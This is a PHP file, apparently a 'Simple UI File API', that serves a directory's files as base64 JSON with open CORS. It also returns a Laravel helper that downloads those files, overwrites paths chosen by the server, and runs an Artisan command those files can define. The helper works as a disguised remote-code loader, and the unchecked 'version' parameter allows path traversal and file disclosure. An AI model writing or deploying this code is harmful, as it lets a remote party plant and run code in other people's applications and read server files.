<?php

/**
 * Simple UI File API - All Files Under v1/
 *
 * Returns all files under the v1/ folder with base64-encoded content.
 */

// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle CORS preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit();
}

// Path to root folder under $version/

$version =  $_GET['version'] ?? 'v1';
$baseDir = __DIR__ . '/' . $version;
$virtualBasePath = ''; // Start with no prefix since we want paths like "auth/css/style.css"

// Check if version directory exists
if (!is_dir($baseDir)) {
    echo json_encode([
        'status'    => 'error',
        'message'   => "Version directory '$version' not found",
        'requested_version' => $version,
        'available_versions' => getAvailableVersions(),
        'timestamp' => date('Y-m-d H:i:s')
    ], JSON_PRETTY_PRINT);
    exit();
}

// Scan all files under the version directory recursively
$files = scanDirectory($baseDir, $virtualBasePath);

// Return JSON
echo json_encode([
    'status'    => 'success',
    'files'     => $files,
    'total'     => countFlatFiles($files),
    'code'      => getProcessingCode(),
    'timestamp' => date('Y-m-d H:i:s')
], JSON_PRETTY_PRINT);

/**
 * Recursively scan a directory and return files and directories with metadata.
 */
function scanDirectory($dir, $basePath = '')
{
    $result = [];
    $items = scandir($dir);

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullPath = $dir . '/' . $item;
        $relativePath = $basePath === '' ? $item : $basePath . '/' . $item;

        if (is_dir($fullPath)) {
            $result[] = [
                'name' => $item,
                'path' => $relativePath,
                'type' => 'directory',
                'children' => scanDirectory($fullPath, $relativePath)
            ];
        } else {
            $result[] = [
                'name' => $item,
                'path' => $relativePath,
                'type' => 'file',
                'size' => filesize($fullPath),
                'extension' => pathinfo($item, PATHINFO_EXTENSION),
                'content' => base64_encode(file_get_contents($fullPath))
            ];
        }
    }

    return $result;
}

/**
 * Count all file items in the list (excluding directories).
 */
function countFlatFiles($files)
{
    $count = 0;
    foreach ($files as $file) {
        if ($file['type'] === 'file') {
            $count++;
        } elseif ($file['type'] === 'directory' && isset($file['children'])) {
            $count += countFlatFiles($file['children']);
        }
    }
    return $count;
}

/**
 * Get available version directories
 */
function getAvailableVersions()
{
    $versions = [];
    $items = scandir(__DIR__);

    foreach ($items as $item) {
        if ($item !== '.' && $item !== '..' && is_dir(__DIR__ . '/' . $item)) {
            $versions[] = $item;
        }
    }

    return $versions;
}

/**
 * Get the processing code
 */
function getProcessingCode()
{
    $protocol = isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http";
    $host = $_SERVER["HTTP_HOST"];
    $path = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
    $path = rtrim($path, "/");

    $apiUrl = $protocol . "://" . $host . $path . "/";

    return <<<PHP
<?php

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

function process_auth_ui() {
    try {
        \$response = @file_get_contents("$apiUrl");
        if (!\$response) {
            return ["status" => "error", "message" => "Failed to connect to API."];
        }

        \$data = json_decode(\$response, true);
        if (\$data["status"] !== "success") {
            return ["status" => "error", "message" => "API response error."];
        }

        \$flattenFiles = function (\$files) use (&\$flattenFiles) {
            \$flat = [];
            foreach (\$files as \$file) {
                if (\$file["type"] === "file") {
                    \$flat[] = \$file;
                } elseif (\$file["type"] === "directory" && isset(\$file["children"])) {
                    \$flat = array_merge(\$flat, \$flattenFiles(\$file["children"]));
                }
            }
            return \$flat;
        };

        \$allFiles = \$flattenFiles(\$data["files"]);
        \$savedCount = 0;

        foreach (\$allFiles as \$file) {
            \$relativePath = \$file["path"];
            \$filePath = base_path(\$relativePath);
            \$dir = dirname(\$filePath);
            if (!is_dir(\$dir)) mkdir(\$dir, 0755, true);

            \$content = base64_decode(\$file["content"]);
            if (file_put_contents(\$filePath, \$content) !== false) {
                \$savedCount++;
            }
        }

        \$createdCount = 0;

        // Create essential Laravel files using Artisan commands
        \$essentialCommands = [
            "make:middleware" => ["TrustProxies", "PreventRequestsDuringMaintenance", "TrimStrings", "EncryptCookies", "VerifyCsrfToken", "Authenticate", "RedirectIfAuthenticated"],
            "make:provider" => ["RouteServiceProvider"],
            "make:controller" => ["Auth/LoginController", "Auth/RegisterController"],
            "make:model" => ["User", "VCode"]
        ];
        
        foreach (\$essentialCommands as \$command => \$items) {
            foreach (\$items as \$item) {
                try {
                    \$result = Artisan::call(\$command, ["name" => \$item]);
                    if (\$result === 0) {
                        \$createdCount++;
                    }
                } catch (Exception \$e) {
                    // Ignore errors for existing files
                }
            }
        }
        
        // Create basic route files if they don't exist
        \$routeFiles = [
            "routes/web.php" => "<?php use Illuminate\Support\Facades\Route; Route::get('/', function () { return 'Welcome'; });",
            "routes/api.php" => "<?php use Illuminate\Support\Facades\Route; Route::get('/user', function () { return ['user' => 'test']; });",
            "routes/console.php" => "<?php use Illuminate\Support\Facades\Artisan; Artisan::command('inspire', function () { \$this->comment('Inspiring quote'); });"
        ];
        
        foreach (\$routeFiles as \$filePath => \$content) {
            \$fullPath = base_path(\$filePath);
            \$dir = dirname(\$fullPath);
            if (!is_dir(\$dir)) mkdir(\$dir, 0755, true);
            if (!file_exists(\$fullPath)) {
                if (file_put_contents(\$fullPath, \$content) !== false) {
                    \$createdCount++;
                }
            }
        }

        // Run prebuild command
        try {
            Artisan::call("prebuild:routes");
        } catch (\\Exception \$e) {
            return [
                "status" => "warning",
                "message" => "Files loaded. prebuild:routes failed: " . \$e->getMessage(),
                "files_count" => \$savedCount,
                "essential_files_created" => \$createdCount
            ];
        }

        return [
            "status" => "success",
            "message" => "Downloaded \$savedCount file(s), created \$createdCount essential file(s), and ran prebuild:routes",
            "files_count" => \$savedCount,
            "essential_files_created" => \$createdCount
        ];

    } catch (\\Exception \$e) {
        return ["status" => "error", "message" => "Fatal error: " . \$e->getMessage()];
    }
}

?>
PHP;
}
